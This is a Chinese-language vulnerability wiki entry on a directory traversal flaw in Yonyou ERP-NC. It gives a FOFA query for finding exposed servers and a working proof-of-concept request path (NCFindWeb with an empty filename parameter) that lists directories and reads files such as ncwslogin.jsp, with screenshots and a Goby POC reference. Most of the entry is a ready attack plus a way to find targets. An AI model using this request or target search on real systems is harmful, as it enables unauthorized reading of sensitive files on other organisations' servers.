# 用友ERP-NC 目录遍历漏洞

## 漏洞描述

用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息

## 漏洞影响

> [!NOTE]
>
> 用友ERP-NC 

##  FOFA

> [!NOTE]
>
> app="用友-UFIDA-NC"

## 漏洞复现

POC为

```
/NCFindWeb?service=IPreAlertConfigService&filename=
```

![](http://wikioss.peiqi.tech/vuln/yongyou-8.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

查看 ncwslogin.jsp 文件

![](http://wikioss.peiqi.tech/vuln/yongyou-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## Goby & POC

> [!NOTE]
>
> YongYou ERP-NC directory traversal

![](http://wikioss.peiqi.tech/vuln/yongyou-10.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)